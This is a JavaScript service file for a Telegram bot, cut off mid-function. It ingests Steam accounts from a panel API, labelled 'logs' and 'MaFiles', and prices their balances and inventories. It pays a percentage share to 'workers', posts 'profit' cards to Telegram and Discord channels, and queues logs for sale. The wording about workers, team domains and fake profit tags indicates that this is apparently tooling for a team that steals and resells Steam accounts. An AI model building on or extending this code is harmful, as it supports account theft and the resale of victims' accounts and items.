const { Input } = require("telegraf");
const SteamLog = require("../models/SteamLog");
const User = require("../models/User");
const { env } = require("../config/env");
const { logger } = require("../utils/logger");
const { pe, E, FALLBACK, telegramHtmlCaption } = require("../utils/emoji");
const { renderSteamProfitImage } = require("../utils/steamImageRenderer");
const { renderSteamLogImage } = require("../utils/steamLogImageRenderer");
const {
  steamLogSellKeyboard,
  steamLogSellPendingKeyboard,
} = require("../keyboards/common");
const { getUserByTelegramId, getUserByPanelUsername } = require("./userService");
const {
  authCredentials,
  isServiceUnavailable,
  isServiceUnavailableError,
  serviceUnavailableMsLeft,
  invalidatePanelToken,
  getAllTeamDomains,
} = require("./apiService");
const { sanitizeEntities } = require("./postService");
const { buildMafileChannelCaption } = require("./mafileStatusService");
const { buildProfitCaption, syncProfitChannelCaption } = require("./adminTelegramLogService");
const { buildAdminMaFilePhoto } = require("./steamLogAdminService");
const { resolveFakeProfitTag, formatFakeProfitTagLabel } = require("../utils/fakeProfitTag");
const {
  getSteamAccounts,
  getSteamAccountById,
  invalidateSteamAccountsCache,
} = require("./steamApiService");
const {
  bindTelegram: bindActivityLogTelegram,
  logNewSteamAccount,
  logSteamLogAction,
  logAccountStatusChange,
} = require("./steamActivityLogService");
const { notifyDiscordSteamCard } = require("../discord/steamLogNotify");
const { formatAccountSourcePage, preferSourcePage, buildDomainLookup } = require("../utils/steamSourcePage");
const {
  rawUprojectStatus,
  isMafileSessionInvalid,
  resolveSessionCheckedAt,
} = require("./steamControlService");

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

let pollInFlight = false;
let pollStartedAt = 0;
let lastCircuitLogAt = 0;
let lastPollFailLogAt = 0;
let consecutivePollFails = 0;
let activeDomainById = null;
const POLL_WATCHDOG_MS = 90_000;

function calcWorkerShare(total) {
  return Number((Math.max(0, Number(total) || 0) * Math.max(1, Math.min(100, env.steamWorkerPercent)) / 100).toFixed(2));
}

function accountBalanceUsd(account) {
  const steam = account?.steamInfo || {};
  if (steam.balanceUsd != null && Number.isFinite(Number(steam.balanceUsd))) {
    return Math.max(0, Number(steam.balanceUsd));
  }
  if (steam.balance != null && Number.isFinite(Number(steam.balance))) {
    return Math.max(0, Number(steam.balance));
  }
  return 0;
}

/** Как на панели: tradable (иначе marketable / total). Не accountPrice — там копия баланса. */
function accountInventoryUsd(account) {
  return inventoryPriceUsd(account?.inventory?.price, 0);
}

function parseUsdNumber(value) {
  if (value && typeof value === "object") {
    return parseUsdNumber(value.usd ?? value.value ?? value.amount ?? value.total ?? value.price);
  }
  if (typeof value === "string") {
    const normalized = value.replace(/\s+/g, "").replace(",", ".").replace(/[^0-9.-]/g, "");
    const parsed = Number(normalized);
    return Number.isFinite(parsed) ? parsed : 0;
  }
  const parsed = Number(value);
  return Number.isFinite(parsed) ? parsed : 0;
}

/** Берём первую положительную оценку: tradable → marketable → total. Явный 0 не маскирует fallback. */
function inventoryPriceUsd(priceObj, fallback = 0) {
  const price = priceObj && typeof priceObj === "object" ? priceObj : { total: priceObj };
  // UProject отдаёт оценку в разных версиях API: flat price, usd/value или price.{...}.
  const nested = price.price && typeof price.price === "object" ? price.price : {};
  for (const key of ["tradable", "marketable", "total", "usd", "value", "amount"]) {
    const n = parseUsdNumber(price[key] ?? nested[key]);
    if (n > 0) return n;
  }
  return Math.max(0, parseUsdNumber(fallback));
}

function preferBetterInventoryPrice(basePrice, enrichPrice) {
  const base = basePrice && typeof basePrice === "object" ? basePrice : {};
  const enrich = enrichPrice && typeof enrichPrice === "object" ? enrichPrice : {};
  const pick = (key) => {
    const a = parseUsdNumber(base[key]);
    const b = parseUsdNumber(enrich[key]);
    const aOk = a > 0;
    const bOk = b > 0;
    if (aOk && bOk) return Math.max(a, b);
    if (bOk) return b;
    if (aOk) return a;
    if (enrich[key] != null) return enrich[key];
    return base[key];
  };
  return {
    ...base,
    ...enrich,
    tradable: pick("tradable"),
    marketable: pick("marketable"),
    total: pick("total"),
    locked: enrich.locked != null ? enrich.locked : base.locked,
    lockedDate: enrich.lockedDate != null ? enrich.lockedDate : base.lockedDate,
  };
}

/** Общая сумма лога = баланс + цена инвентаря. */
function calcLogTotal(account) {
  return Number((accountBalanceUsd(account) + accountInventoryUsd(account)).toFixed(2));
}

function formatLogTotalUsd(total) {
  return `${Number(total || 0).toFixed(2).replace(".", ",")}$`;
}

function pushText(parts, text) {
  parts.push(String(text ?? ""));
}

function pushCustomEmoji(parts, entities, key) {
  const fb = FALLBACK[key] || "•";
  const id = E[key];
  if (id) {
    entities.push({
      type: "custom_emoji",
      offset: parts.join("").length,
      length: fb.length,
      custom_emoji_id: String(id),
    });
  }
  parts.push(fb);
}

function pushBold(parts, entities, text) {
  const value = String(text ?? "");
  entities.push({ type: "bold", offset: parts.join("").length, length: value.length });
  parts.push(value);
}

function pushCode(parts, entities, text) {
  const value = String(text ?? "");
  entities.push({ type: "code", offset: parts.join("").length, length: value.length });
  parts.push(value);
}

function buildValidLogCaption(account) {
  const balance = accountBalanceUsd(account);
  const inventory = accountInventoryUsd(account);
  const total = calcLogTotal(account);
  return [
    `${pe("celebrate")} <b>Поздравляем вас с новым логом!</b>`,
    "",
    `${pe("coins")} Общая сумма лога: <b>${formatLogTotalUsd(total)}</b>`,
    `└ Баланс: ${formatLogTotalUsd(balance)}`,
    `└ Инвентарь: ${formatLogTotalUsd(inventory)}`,
  ].join("\n");
}

/** Текст заявки на продажу с premium emoji через entities (надёжнее в каналах). */
function buildLogSaleChannelMessage(log, user) {
  const parts = [];
  const entities = [];
  const nick = user?.username ? `@${user.username}` : "—";
  const login = String(log.accountUsername || log.steamId || log.sourceId || "—");

  pushCustomEmoji(parts, entities, "package");
  pushText(parts, " ");
  pushBold(parts, entities, "Заявка на продажу лога");
  pushText(parts, "\n\n");

  pushCustomEmoji(parts, entities, "profile");
  pushText(parts, " Воркер: ");
  pushText(parts, nick);
  pushText(parts, "\n");

  pushCustomEmoji(parts, entities, "users");
  pushText(parts, " Telegram ID: ");
  pushCode(parts, entities, log.ownerTelegramId || "—");
  pushText(parts, "\n");

  pushCustomEmoji(parts, entities, "tag");
  pushText(parts, " Логин: ");
  pushCode(parts, entities, login);
  pushText(parts, "\n\n");

  pushCustomEmoji(parts, entities, "coins");
  pushText(parts, " Общая сумма: ");
  pushBold(parts, entities, formatLogTotalUsd(log.totalProfit));
  pushText(parts, "\n");
  pushText(parts, `└ Баланс: ${formatLogTotalUsd(log.balanceUsd)}\n`);
  pushText(parts, `└ Инвентарь: ${formatLogTotalUsd(log.inventoryUsd)}\n\n`);

  pushCustomEmoji(parts, entities, "file");
  pushText(parts, " ID лога: ");
  pushCode(parts, entities, log.sourceId || "—");
  pushText(parts, "\n");

  pushCustomEmoji(parts, entities, "time");
  pushText(parts, " Статус: ");
  pushBold(parts, entities, "ожидает");

  return {
    text: parts.join(""),
    entities: sanitizeEntities(entities),
  };
}

function snapshotAccountFields(account, domainById = activeDomainById) {
  const balanceUsd = accountBalanceUsd(account);
  const inventoryUsd = accountInventoryUsd(account);
  const checkedAt = resolveSessionCheckedAt(account);
  const checkedDate = checkedAt ? new Date(checkedAt) : null;
  return {
    balanceUsd,
    inventoryUsd,
    totalProfit: Number((balanceUsd + inventoryUsd).toFixed(2)),
    accountUsername: String(account?.username || account?.steamInfo?.nickname || ""),
    sourcePage: formatAccountSourcePage(account, domainById),
    steamId: String(account?.steamInfo?.steamid || ""),
    accountStatus: rawUprojectStatus(account),
    sessionInvalid: isMafileSessionInvalid(account),
    uprojectInvalidDate:
      checkedDate && !Number.isNaN(checkedDate.getTime()) ? checkedDate : null,
  };
}

function applyUprojectSessionState(log, account) {
  if (!log || !account) return false;
  const next = snapshotAccountFields(account);
  let dirty = false;
  if (Boolean(log.sessionInvalid) !== Boolean(next.sessionInvalid)) {
    log.sessionInvalid = Boolean(next.sessionInvalid);
    dirty = true;
  }
  const prevStamp = log.uprojectInvalidDate ? new Date(log.uprojectInvalidDate).getTime() : 0;
  const nextStamp = next.uprojectInvalidDate ? new Date(next.uprojectInvalidDate).getTime() : 0;
  if (prevStamp !== nextStamp) {
    log.uprojectInvalidDate = next.uprojectInvalidDate;
    dirty = true;
  }
  return dirty;
}

async function loadTeamDomainLookup() {
  try {
    const listed = await getAllTeamDomains();
    return buildDomainLookup(listed);
  } catch (error) {
    logger.warn("Steam domain lookup failed", error?.message || error);
    return new Map();
  }
}

/**
 * @returns {"changed"|"silent"|false}
 */
async function trackAccountStatusChange(log, account) {
  const next = rawUprojectStatus(account);
  if (!next) return false;
  const prev = String(log.accountStatus || "").trim();
  if (prev === next) return false;
  log.accountStatus = next;
  // First observed status after empty/backfill: store silently (no activity flood).
  if (!prev) return "silent";
  const fingerprint = `${prev}→${next}`;
  if (String(log.accountStatusActivityKey || "") === fingerprint) return "silent";
  log.accountStatusActivityKey = fingerprint;
  void logAccountStatusChange({
    sourceId: log.sourceId,
    fromStatus: prev,
    toStatus: next,
  }).catch(() => {});
  return "changed";
}

/**
 * When UProject marks a MaFile as Invalid, mirror that into Garbona mafileStatus
 * so the profit caption updates automatically.
 */
function maybeApplyUprojectMafileInvalid(log, account) {
  if (String(log?.logKind || "") !== "mafile") return false;
  const upStatus = String(account?.status || "").trim();
  if (!/invalid|невалид/i.test(upStatus)) return false;
  const current = String(log.mafileStatus || "pending").trim().toLowerCase();
  if (current !== "pending" && current !== "") return false;
  log.mafileStatus = "invalid";
  log.mafileStatusUpdatedAt = new Date();
  log.mafileStatusUpdatedBy = "system:uproject";
  return true;
}

async function syncProfitCaptionIfPosted(bot, log, account) {
  if (!bot?.telegram || !String(log?.channelMessageId || "").trim()) return;
  try {
    await syncProfitChannelCaption(bot, log, account);
  } catch (error) {
    logger.warn("Profit caption auto-sync failed", log?.sourceId, error?.message || error);
  }
}

async function submitLogSaleRequest(bot, log) {
  if (!env.steamLogSaleChannelId) {
    throw new Error("Не задан STEAM_LOG_SALE_CHANNEL_ID.");
  }
  if (log.saleStatus === "pending" || log.saleStatus === "done") {
    throw new Error("Заявка по этому логу уже отправлена.");
  }
  const user = log.ownerTelegramId ? await getUserByTelegramId(log.ownerTelegramId) : null;
  const { text, entities } = buildLogSaleChannelMessage(log, user);
  const sent = await bot.telegram.sendMessage(env.steamLogSaleChannelId, text, {
    entities,
  });
  log.saleStatus = "pending";
  log.saleChannelChatId = String(sent.chat.id);
  log.saleChannelMessageId = String(sent.message_id);
  await log.save();
  return sent;
}

async function pinDmMessage(bot, telegramId, messageId) {
  if (!telegramId || !messageId) return;
  try {
    await bot.telegram.pinChatMessage(telegramId, Number(messageId), {
      disable_notification: true,
    });
  } catch (error) {
    logger.warn("Steam DM pin failed", telegramId, error?.response?.description || error.message);
  }
}

function topItems(inventory) {
  const payload = unwrapInventory(inventory);
  const groups = Array.isArray(payload?.inventories) ? payload.inventories : [];
  const flat = groups.flatMap((group) => Array.isArray(group?.items) ? group.items : []);
  const direct = Array.isArray(payload?.items) ? payload.items : [];
  return [...flat, ...direct]
    .map((item) => ({
      appid: Number(item?.appid || item?.appId || 0),
      icon:
        item.icon ||
        item.icon_url ||
        item.iconUrl ||
        item.image ||
        item.imageUrl ||
        item.asset_description?.icon_url ||
        item.assetDescription?.icon_url ||
        item.description?.icon_url ||
        "",
      itemHashName:
        item.itemHashName ||
        item.market_hash_name ||
        item.hash_name ||
        item.asset_description?.market_hash_name ||
        item.assetDescription?.market_hash_name ||
        item.description?.market_hash_name ||
        item.name ||
        "Unknown item",
      price: inventoryPriceUsd(item?.price, item?.priceUsd ?? item?.price_usd ?? item?.value ?? 0),
    }))
    .filter((item) => item.price > 0)
    .sort((a, b) => b.price - a.price)
    .slice(0, 7);
}

function unwrapPayload(payload, keys) {
  let value = payload;
  for (let i = 0; i < 4 && value && typeof value === "object"; i += 1) {
    const nextKey = keys.find((key) => value[key] && typeof value[key] === "object");
    if (!nextKey) break;
    value = value[nextKey];
  }
  return value || {};
}

function unwrapInventory(payload) {
  return unwrapPayload(payload, ["data", "result", "inventory"]);
}

function unwrapAccount(payload) {
  return unwrapPayload(payload, ["data", "result", "account", "row"]);
}

/** Классификация статуса лога как в панели: Валид / MaFile / прочее. */
function classifyAccountLog(row) {
  if (row?.isMaFile === true || /mafile/i.test(String(row?.status || ""))) return "mafile";
  const status = String(row?.status || "");
  if (/невалид|invalid/i.test(status)) return "invalid";
  // Ok + пост-валидные статусы UProject (OnSell / Converted и т.п.):
  // статус может смениться быстрее, чем полл увидел Ok — карточку шлём один раз.
  if (
    /^(ok|valid|валид|onsell|onhold|onhandle|processed|sold|converted)$/i.test(status) &&
    !row?.invalidDate
  ) {
    return "valid";
  }
  return "other";
}

/** MaFile → лог (Converted / MaFileToLog): в профит-канале остаётся MaFile, не «Лог у …». */
function isMafileConvertedToLog(log, account) {
  if (log?.convertedFromMafile) return true;
  if (String(log?.logKind || "") !== "mafile") return false;
  return classifyAccountLog(account) === "valid";
}

function markMafileConvertedToLog(log, account) {
  log.convertedFromMafile = true;
  log.logKind = "valid";
  log.accountStatus = String(account?.status || log.accountStatus || "").trim();
  Object.assign(log, snapshotAccountFields(account));
}

async function resolveOwnerTelegramId(row, fallbackTelegramId = "") {
  // Сначала владелец из лога (фильтр воркеров / owner), иначе кто опросил API.
  const telegram = row?.owner?.telegram;
  if (telegram) return String(telegram);
  const panelLogin = row?.owner?.username;
  if (panelLogin) {
    const user = await getUserByPanelUsername(panelLogin);
    if (user?.telegramId) return String(user.telegramId);
  }
  if (fallbackTelegramId) return String(fallbackTelegramId);
  return "";
}

function resolveProfitChannelId(source = env) {
  return String(
    source.steamProfitChannelId ||
    source.steamManualProfitChannelId ||
    source.aboutPayoutsChatId ||
    ""
  ).trim();
}

function accountRowsFromPayload(payload) {
  if (Array.isArray(payload?.rows)) return payload.rows;
  if (Array.isArray(payload?.data)) return payload.data;
  if (Array.isArray(payload)) return payload;
  return [];
}

function isSteamId64(value) {
  return /^7656119\d{10}$/.test(String(value || "").trim());
}

async function upsertSteamLogFromAccount(account, extra = {}) {
  const row = unwrapAccount(account) || account;
  const sourceId = String(row?.id || extra.sourceId || "").trim();
  if (!/^\d+$/.test(sourceId)) return null;

  const kind = classifyAccountLog(row);
  const snap = snapshotAccountFields(row);
  const ownerTelegramId = String(
    extra.ownerTelegramId ||
    (await resolveOwnerTelegramId(row, extra.fallbackTelegramId)) ||
    ""
  ).trim();

  const existing = await SteamLog.findOne({ sourceId });
  if (existing) {
    if (ownerTelegramId && !String(existing.ownerTelegramId || "").trim()) {
      existing.ownerTelegramId = ownerTelegramId;
    }
    if ((kind === "valid" || kind === "mafile") && existing.logKind !== "mafile") {
      existing.logKind = kind;
    }
    const previousSourcePage = existing.sourcePage;
    if (Number(snap.totalProfit || 0) > Number(existing.totalProfit || 0)) {
      Object.assign(existing, snap);
    } else {
      if (snap.accountUsername && !existing.accountUsername) {
        existing.accountUsername = snap.accountUsername;
      }
      if (snap.steamId && !existing.steamId) existing.steamId = snap.steamId;
    }
    if (snap.accountStatus) existing.accountStatus = snap.accountStatus;
    existing.sourcePage = preferSourcePage(snap.sourcePage, previousSourcePage);
    await existing.save();
    return existing;
  }

  return SteamLog.create({
    sourceId,
    ownerTelegramId,
    status: "new",
    logKind: kind === "valid" || kind === "mafile" ? kind : "other",
    ...snap,
  });
}

async function sendDmPhoto(bot, telegramId, imageBuffer, caption, filename, extra = {}) {
  if (!telegramId) return null;
  try {
    return await bot.telegram.sendPhoto(
      telegramId,
      Input.fromBuffer(imageBuffer, filename),
      { ...telegramHtmlCaption(caption), ...extra }
    );
  } catch (error) {
    logger.warn("Steam DM failed", telegramId, error?.response?.description || error.message);
    return null;
  }
}

function isEmptyProfitPost(snap, items = []) {
  const total = Number(snap?.totalProfit || 0);
  if (total > 0.005) return false;
  return !items.some((item) => Number(item?.price || 0) > 0.005);
}

async function postProfitChannel(bot, { imageBuffer, caption }) {
  const profitChannelId = resolveProfitChannelId();
  if (!profitChannelId) throw new Error("Не задан STEAM_PROFIT_CHANNEL_ID.");
  return bot.telegram.sendPhoto(
    profitChannelId,
    Input.fromBuffer(imageBuffer, `steam-profit-${Date.now()}.png`),
    telegramHtmlCaption(caption)
  );
}

async function postAdminLogsChannel(bot, { imageBuffer, filename, caption }) {
  if (!env.steamAdminLogsChannelId) return null;
  try {
    return await bot.telegram.sendPhoto(
      env.steamAdminLogsChannelId,
      Input.fromBuffer(imageBuffer, filename),
      telegramHtmlCaption(caption)
    );
  } catch (error) {
    logger.warn("Admin logs channel post failed", error?.response?.description || error.message);
    return null;
  }
}

async function buildAdminChannelOwnerLabel(ownerTelegramId) {
  const user = ownerTelegramId ? await getUserByTelegramId(ownerTelegramId) : null;
  if (!user) return ownerTelegramId ? `<code>${ownerTelegramId}</code>` : "—";
  if (user.isAnonymous) return `<code>${user.telegramId}</code>`;
  return user.username ? `@${user.username}` : `<code>${user.telegramId}</code>`;
}

async function processValidLog(bot, log, account) {
  const skipLogProfitPost = isMafileConvertedToLog(log, account);
  if (skipLogProfitPost) {
    log.convertedFromMafile = true;
  }

  const imageBuffer = await renderSteamLogImage(account);
  const snap = snapshotAccountFields(account);
  let dm = null;
  if (!String(log.dmMessageId || "").trim()) {
    dm = await sendDmPhoto(
      bot,
      log.ownerTelegramId,
      imageBuffer,
      buildValidLogCaption(account),
      `steam-log-${log.sourceId}.png`,
      { reply_markup: steamLogSellKeyboard(log.sourceId).reply_markup }
    );
    if (dm) await pinDmMessage(bot, log.ownerTelegramId, dm.message_id);
  }

  let adminMsg = null;
  if (!String(log.adminChannelMessageId || "").trim()) {
    const ownerLabel = await buildAdminChannelOwnerLabel(log.ownerTelegramId);
    const login = String(account?.username || account?.steamInfo?.nickname || log.sourceId);
    adminMsg = await postAdminLogsChannel(bot, {
      imageBuffer,
      filename: `steam-log-${log.sourceId}.png`,
      caption: [
        `${pe("package")} <b>Новый лог</b> · Валид`,
        `${pe("profile")} Воркер: ${ownerLabel}`,
        `${pe("tag")} Логин: <code>${login}</code>`,
        `${pe("coins")} Общая сумма: <b>${formatLogTotalUsd(snap.totalProfit)}</b>`,
        `└ Баланс: ${formatLogTotalUsd(snap.balanceUsd)}`,
        `└ Инвентарь: ${formatLogTotalUsd(snap.inventoryUsd)}`,
        `${pe("file")} ID: <code>${log.sourceId}</code>`,
      ].join("\n"),
    });
  }

  let discordMsgId = String(log.discordChannelMessageId || "");
  let discordPosted = false;
  if (!discordMsgId && imageBuffer) {
    try {
      discordMsgId =
        (await notifyDiscordSteamCard({
          kind: "valid",
          imageBuffer,
          sourceId: log.sourceId,
          ownerTelegramId: log.ownerTelegramId,
          total: snap.totalProfit,
          balanceUsd: snap.balanceUsd,
          inventoryUsd: snap.inventoryUsd,
        })) || "";
      discordPosted = Boolean(discordMsgId);
    } catch (error) {
      logger.warn("Discord valid log post failed", log.sourceId, error.message);
    }
  }

  let channelMessageId = String(log.channelMessageId || "");
  let channelPosted = false;
  if (!channelMessageId && !isEmptyProfitPost(snap) && !skipLogProfitPost) {
    try {
      const ownerUser = log.ownerTelegramId ? await getUserByTelegramId(log.ownerTelegramId) : null;
      const caption = await buildProfitCaption(account, {
        telegramId: log.ownerTelegramId,
        user: ownerUser,
      }, log);
      const sent = await postProfitChannel(bot, { imageBuffer, caption });
      channelMessageId = String(sent.message_id);
      channelPosted = true;
      log.channelMessageId = channelMessageId;
      await log.save();
    } catch (error) {
      logger.warn("Valid log profit channel post failed", log.sourceId, error.message);
    }
  }

  const hasDm =
    Boolean(dm) || Boolean(String(log.dmMessageId || "").trim());
  const hasAdmin =
    Boolean(adminMsg) ||
    Boolean(String(log.adminChannelMessageId || "").trim()) ||
    !env.steamAdminLogsChannelId;
  const hasChannel = Boolean(channelMessageId);

  Object.assign(log, {
    // Не помечаем processed, если карточка никуда не ушла — иначе полл её «забывает».
    status: hasDm || hasAdmin || hasChannel ? "processed" : "failed",
    logKind: "valid",
    ...snap,
    dmMessageId: dm ? String(dm.message_id) : log.dmMessageId || "",
    dmChatId: dm ? String(dm.chat?.id || log.ownerTelegramId) : log.dmChatId || "",
    channelMessageId,
    adminChannelMessageId: adminMsg ? String(adminMsg.message_id) : log.adminChannelMessageId || "",
    discordChannelMessageId: discordMsgId || log.discordChannelMessageId || "",
    errorMessage: hasAdmin || hasChannel
      ? hasDm
        ? ""
        : "dm_send_failed"
      : "admin_channel_send_failed",
  });

  // Только при первой доставке карточки — без спама на ретраях.
  if (dm || adminMsg || channelPosted || discordPosted) {
    void logSteamLogAction({
      sourceId: log.sourceId,
      kind: "Валид",
      account,
      totalUsd: snap.totalProfit,
    }).catch(() => {});
  }
}

async function processMaFileLog(bot, log, account) {
  // Список /steam/accounts часто содержит сокращённую строку без inventory items.
  // Раскрываем карточку, затем рисуем тем же buildAdminMaFilePhoto, что админка / профит.
  let sourceAccount = account;
  try {
    const detailed = unwrapAccount(await getSteamAccountById(null, account.id || log.sourceId));
    if (detailed?.id != null || detailed?.steamInfo || detailed?.inventory) {
      sourceAccount = {
        ...account,
        ...detailed,
        steamInfo: { ...(account.steamInfo || {}), ...(detailed.steamInfo || {}) },
        inventory: { ...(account.inventory || {}), ...(detailed.inventory || {}) },
      };
    }
  } catch (error) {
    logger.warn("MaFile account details fetch failed", log.sourceId, error.message);
  }

  const pollSnap = snapshotAccountFields(sourceAccount);
  let built = null;
  try {
    built = await buildAdminMaFilePhoto(sourceAccount, {
      enrich: true,
      returnSnapshot: true,
    });
  } catch (error) {
    logger.warn("MaFile card build failed", log.sourceId, error.message);
  }

  const snap = {
    balanceUsd: Number(built?.snapshot?.balanceUsd ?? pollSnap.balanceUsd) || 0,
    inventoryUsd: Number(built?.snapshot?.inventoryUsd ?? pollSnap.inventoryUsd) || 0,
    totalProfit: Number(built?.snapshot?.total ?? pollSnap.totalProfit) || 0,
  };
  // Не даём enrich с пустым инвентарём затереть уже известную сумму с полла.
  if (pollSnap.totalProfit > snap.totalProfit) {
    snap.balanceUsd = Math.max(snap.balanceUsd, pollSnap.balanceUsd);
    snap.inventoryUsd = Math.max(snap.inventoryUsd, pollSnap.inventoryUsd);
    snap.totalProfit = pollSnap.totalProfit;
  }
  const total = snap.totalProfit;

  const {
    shouldAutoConvertMafile,
    maybeAutoConvertMafileToLog,
    mafileAutoConvertMaxUsd,
  } = require("./autoMafileConvertService");
  if (shouldAutoConvertMafile(log, total)) {
    const convert = await maybeAutoConvertMafileToLog(log);
    if (convert?.started) {
      if (!String(log.dmMessageId || "").trim() && log.ownerTelegramId) {
        try {
          const dm = await bot.telegram.sendMessage(
            log.ownerTelegramId,
            [
              `${pe("info")} MaFile <b>$${total.toFixed(2)}</b> — ниже $${mafileAutoConvertMaxUsd()}.`,
              "Автоматически конвертируем в лог и выставляем на продажу.",
              `${pe("file")} ID: <code>${log.sourceId}</code>`,
            ].join("\n"),
            { parse_mode: "HTML" }
          );
          log.dmMessageId = String(dm?.message_id || "");
          log.dmChatId = String(log.ownerTelegramId);
        } catch (error) {
          logger.warn("MaFile auto-convert DM failed", log.sourceId, error.message);
        }
      }
      Object.assign(log, {
        status: "processed",
        logKind: "mafile",
        ...snap,
        errorMessage: "",
      });
      void logSteamLogAction({
        sourceId: log.sourceId,
        kind: "MaFile",
        account: sourceAccount,
        totalUsd: total,
        detail: `автоконверт < $${mafileAutoConvertMaxUsd()}`,
      }).catch(() => {});
      return;
    }
  }

  const items = Array.isArray(built?.snapshot?.items) ? built.snapshot.items : [];
  const games = Array.isArray(built?.snapshot?.games) ? built.snapshot.games : [];
  const mafileTime = String(built?.snapshot?.mafileTime || "");
  const steamId = String(
    built?.snapshot?.steamId ||
    sourceAccount?.steamInfo?.steamid ||
    sourceAccount?.steamInfo?.steamId ||
    log.steamId ||
    ""
  );

  let imageBuffer = built?.imageBuffer || null;
  const totalsDrift =
    imageBuffer &&
    Math.abs(Number(built?.snapshot?.total || 0) - total) > 0.005;
  if (!imageBuffer || totalsDrift) {
    imageBuffer = await renderSteamProfitImage({
      items,
      games,
      total,
      balanceUsd: snap.balanceUsd,
      inventoryUsd: snap.inventoryUsd,
      mafileTime,
    });
  }

  let dm = null;
  if (!String(log.dmMessageId || "").trim()) {
    dm = await sendDmPhoto(
      bot,
      log.ownerTelegramId,
      imageBuffer,
      `${pe("gift")} <b>Найден новый MaFile</b>\n<code>${sourceAccount.username || sourceAccount.steamInfo?.nickname || log.sourceId}</code>\n${pe("coins")} Сумма: $${total.toFixed(2)}\n└ Баланс: $${Number(snap.balanceUsd || 0).toFixed(2)} · Инвентарь: $${Number(snap.inventoryUsd || 0).toFixed(2)}`,
      `steam-mafile-${log.sourceId}.png`
    );
  }

  let channelMessageId = String(log.channelMessageId || "");
  let channelPosted = false;
  if (!channelMessageId && !isEmptyProfitPost(snap, items)) {
    try {
      const user = log.ownerTelegramId ? await getUserByTelegramId(log.ownerTelegramId) : null;
      const caption = buildMafileChannelCaption({
        sourceId: log.sourceId,
        ownerTelegramId: log.ownerTelegramId,
        user,
        total,
        balanceUsd: snap.balanceUsd,
        inventoryUsd: snap.inventoryUsd,
        status: log.mafileStatus || "pending",
        withdrawnAmount: Number(log.mafileWithdrawnAmount || 0),
      });
      const sent = await postProfitChannel(bot, { imageBuffer, caption });
      channelMessageId = String(sent.message_id);
      channelPosted = true;
      // Сразу пишем id — если процесс упадёт дальше, статус-edit не сделает дубликат.
      log.channelMessageId = channelMessageId;
      await log.save();
    } catch (error) {
      logger.warn("MaFile channel post failed", error.message);
    }
  }

  const ownerLabel = await buildAdminChannelOwnerLabel(log.ownerTelegramId);
  const login = String(sourceAccount?.username || sourceAccount?.steamInfo?.nickname || log.sourceId);
  let adminMsg = null;
  if (!String(log.adminChannelMessageId || "").trim()) {
    adminMsg = await postAdminLogsChannel(bot, {
      imageBuffer,
      filename: `steam-mafile-${log.sourceId}.png`,
      caption: [
        `${pe("gift")} <b>Новый MaFile</b>`,
        `${pe("profile")} Воркер: ${ownerLabel}`,
        `${pe("tag")} Логин: <code>${login}</code>`,
        `${pe("coins")} Сумма: <b>$${total.toFixed(2)}</b>`,
        `└ Баланс: $${Number(snap.balanceUsd || 0).toFixed(2)} · Инвентарь: $${Number(snap.inventoryUsd || 0).toFixed(2)}`,
        `${pe("file")} ID: <code>${log.sourceId}</code>`,
      ].join("\n"),
    });
  }

  let discordMsgId = String(log.discordChannelMessageId || "");
  let discordPosted = false;
  if (!discordMsgId && imageBuffer) {
    try {
      discordMsgId =
        (await notifyDiscordSteamCard({
          kind: "mafile",
          imageBuffer,
          sourceId: log.sourceId,
          ownerTelegramId: log.ownerTelegramId,
          total,
          balanceUsd: snap.balanceUsd,
          inventoryUsd: snap.inventoryUsd,
        })) || "";
      discordPosted = Boolean(discordMsgId);
    } catch (error) {
      logger.warn("Discord MaFile post failed", log.sourceId, error.message);
    }
  }

  Object.assign(log, {
    status: "processed",
    logKind: "mafile",
    steamId: log.steamId || steamId,
    ...snap,
    mafileSnapshot: {
      isFake: false,
      items: items.map((item) => ({
        appid: Number(item?.appid || item?.appId || 0),
        icon: String(item?.icon || ""),
        price: Number(item?.price || 0),
        itemHashName: String(item?.itemHashName || item?.name || "Unknown item"),
      })),
      games: games.map((game) => ({
        appid: Number(game?.appid || game?.appId || 0),
        name: String(game?.name || ""),
        playtime_forever: Number(
          game?.playtime_forever ??
          game?.playtimeForever ??
          game?.playtime ??
          0
        ),
      })),
      mafileTime: String(mafileTime || ""),
    },
    dmMessageId: dm ? String(dm.message_id) : log.dmMessageId || "",
    channelMessageId,
    adminChannelMessageId: adminMsg ? String(adminMsg.message_id) : log.adminChannelMessageId || "",
    discordChannelMessageId: discordMsgId || log.discordChannelMessageId || "",
    errorMessage: "",
  });

  if (dm || adminMsg || channelPosted || discordPosted) {
    void logSteamLogAction({
      sourceId: log.sourceId,
      kind: "MaFile",
      account: sourceAccount,
      totalUsd: total,
    }).catch(() => {});
  }
}

async function processAccountLog(bot, log, account) {
  try {
    const kind = classifyAccountLog(account);
    if (kind === "valid") {
      await processValidLog(bot, log, account);
    } else if (kind === "mafile") {
      await processMaFileLog(bot, log, account);
    } else {
      Object.assign(log, {
        status: "processed",
        logKind: kind,
        ...snapshotAccountFields(account),
        errorMessage: "",
      });
    }
  } catch (error) {
    Object.assign(log, {
      status: "failed",
      errorMessage: error?.response?.data?.message || error.message,
    });
    logger.error("Steam account log process failed", log.sourceId, log.errorMessage);
  }
  await log.save();

  if (log.logKind === "valid" && log.status === "processed") {
    try {
      const { maybeEnqueueAutoSell } = require("./autoLogSaleService");
      await maybeEnqueueAutoSell(log);
    } catch (error) {
      logger.warn("Auto log sale enqueue failed", log.sourceId, error.message);
    }
  }
}

const STUCK_RETRY_COOLDOWN_MS = 5 * 60 * 1000;
const MAX_STUCK_RETRIES_PER_POLL = 2;

async function ingestAccountPages(bot, token, extraQuery = {}, { pages = 4, fallbackTelegramId = "" } = {}) {
  let offset = 0;
  for (let page = 0; page < pages; page += 1) {
    const payload = await getSteamAccounts(token, {
      offset,
      limit: 100,
      skipCache: true,
      ...extraQuery,
    });
    const rows = accountRowsFromPayload(payload);
    if (!rows.length) break;
    await ingestAccountRows(bot, rows, fallbackTelegramId);
    if (!payload?.hasNextPage && rows.length < 100) break;
    const nextOffset = Number(payload?.lastId);
    offset = Number.isFinite(nextOffset) && nextOffset !== offset ? nextOffset : offset + rows.length;
  }
}

async function ingestAccountRows(bot, rows, fallbackTelegramId = "") {
  const fresh = [];
  const retries = [];

  for (const account of rows || []) {
    const sourceId = String(account?.id || "");
    if (!/^\d+$/.test(sourceId)) continue;

    const kind = classifyAccountLog(account);
    const existing = await SteamLog.findOne({ sourceId });

    // Уже известный лог: ловим смену UProject-статуса (MaFile → Невалид и т.п.),
    // даже если это не valid/mafile и в ЛС ничего не шлём.
